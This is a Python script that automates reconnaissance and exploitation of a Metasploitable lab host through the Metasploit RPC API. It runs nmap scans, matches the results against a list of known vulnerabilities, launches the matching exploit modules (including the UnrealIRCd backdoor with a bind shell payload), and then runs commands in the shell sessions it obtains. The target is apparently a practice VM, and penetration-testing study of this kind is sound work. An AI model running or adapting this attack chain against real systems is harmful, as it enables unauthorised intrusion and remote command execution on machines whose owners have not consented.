# for now this nmaps metasploitable, checks if port 6667 is open which runs UnrealIRCd
# which has a vulnerability, and then it exploits that
# NOT ALL VULNERABILITIES LIKE TO RUN AT THE SAME TIME.  SOME ONLY WORK WHEN RUN INDIVIDUALLY

from pymetasploit3.msfrpc import *
import time
import utils
import sys
import nmap_dest
import re
import subprocess
from knownVulnerabilities import vulnerabilities

if __name__ == "__main__":
    #############################################################################
    ### UNCOMMENT THIS TO RUN THE PROGRAM, THEN COMMENT THIS OUT ONCE YOU RUN THE 
    # PROGRAM ONCE, this must run every time you restart ###
    # proc1 = subprocess.Popen(["./setup.sh"])
    # time.sleep(180)
    # proc1.kill()
    ### COMMENT THIS OUT ONCE YOU RUN THE PROGRAM ONCE, must run every time you restart ###

    # basically starts metasploit and kill all previous sessions 
    client = MsfRpcClient('PASSWORD', port=55553, ssl=True)
    for k in client.sessions.list.keys():
        client.sessions.session(str(k)).stop()
    print("session list =", client.sessions.list)
    
    ######### TEST YOUR VULNERABILITY HERE (change the number below to the index of your exploit in the vulnerabilities list)
    # Test your exploits here first cuz they won't work as reliably when all exploits are run at once below
    # vulnerability = vulnerabilities[1]
    # print(vulnerability.description)
    # print(vulnerability.module)
    # RHOSTS = "192.168.119.129" # PUT YOUR HOST HERE
    # module = vulnerability.module
    # exploit = client.modules.use('exploit', module)
    # # options = exploit.options
    # missingOptions = exploit.missing_required
    # if 'RHOSTS' in missingOptions:
    #     print(RHOSTS)
    #     exploit['RHOSTS'] = RHOSTS
    # print("missing options:", exploit.missing_required)
    # if vulnerability.payload:
    #     print("payload:", vulnerability.payload)
    #     exploit.execute(payload=vulnerability.payload)
    # else:
    #     print("no payload")
    #     exploit.execute()
    # time.sleep(vulnerability.sleep)
    # print(client.sessions.list)
    # exit()
    ######### TEST

    ######## RECONAISSANCE PHASE ########
    RHOSTS = "192.168.119.129"
    nmapAggressiveness = 2
    # in order of increasing levels of fucking around (and also in increasing levels of finding out)
    nmapPossibleArgs = ["", "-A -T4", "-p- -sV -O", "-p- -sV -O -A -T5 -sC -Pn"]
    nmapArgs = nmapPossibleArgs[nmapAggressiveness]
    output = nmap_dest.nmap_xml_output(RHOSTS, nmapArgs)
    print(output)
    if (output[1][0:22] == "Note: Host seems down."):
        print("Host seems down. Exiting.")
        exit()

    ######## WEAPONIZATION PHASE ########
    vulnerabilitiesToUse = set()
    for line in output:
        # Detect what keywords each line of the nmap output contains and compare those to the descriptions
        # for each known vulnerability and if all key words of a vulnerability are found, add it to the exploit list
        for vulnerability in vulnerabilities:
            keyWordsFoundCount = 0
            flag = None
            if vulnerability.caseSensitiveKeyTermMatch:
                flag = 0
            else:
                flag = re.IGNORECASE
            # TODO: make it so there is a list of optional or guaranteed key terms
            for keyword in vulnerability.keywords:
                if re.search(keyword, line, flag):
                    keyWordsFoundCount += 1
            if keyWordsFoundCount < vulnerability.minKeyTermsThatMustMatch:
                continue
            if not vulnerability in vulnerabilitiesToUse:
                vulnerabilitiesToUse.add(vulnerability)
                print("*********", vulnerability.description, "EXPLOIT FOUND *********")

    ######## DELIVERY, EXPLOITATION, INSTALLATION PHASE ########
    # exploit = client.modules.use('exploit', 'unix/irc/unreal_ircd_3281_backdoor')
    # exploit['RHOSTS'] = RHOSTS
    # payload = client.modules.use('payload', 'cmd/unix/bind_ruby')
    # exploit.execute(payload='cmd/unix/bind_ruby')
    for vulnerability in vulnerabilitiesToUse:
        module = vulnerability.module
        exploit = client.modules.use('exploit', module)
        # options = exploit.options
        missingOptions = exploit.missing_required
        print("######## EXPLOITING", vulnerability.description, "########")
        if 'RHOSTS' in missingOptions:
            exploit['RHOSTS'] = RHOSTS
        if vulnerability.payload:
            exploit.execute(payload=vulnerability.payload)
        else:
            exploit.execute()
        time.sleep(vulnerability.sleep)
        numSessions = 0
        for k in client.sessions.list.keys():
            numSessions += 1
        print("Total number of sessions created:", numSessions)
        # # if we have a session established, leave
        # for _session in client.sessions.list.keys():
        #     break
    
    ####### Print some info on the sessions created
    print("@@@@@@@@ ALL EXPLOITS FINISHED @@@@@@@@")
    sessions = client.sessions.list
    numSessions = 0
    for k in client.sessions.list.keys():
        numSessions += 1
    print("Number of sessions created:", numSessions)

    for k in client.sessions.list.keys():
        shell = client.sessions.session(str(k))
        shell.write('whoami')
        shell.write('pwd')
        print(shell.read())

    print()
    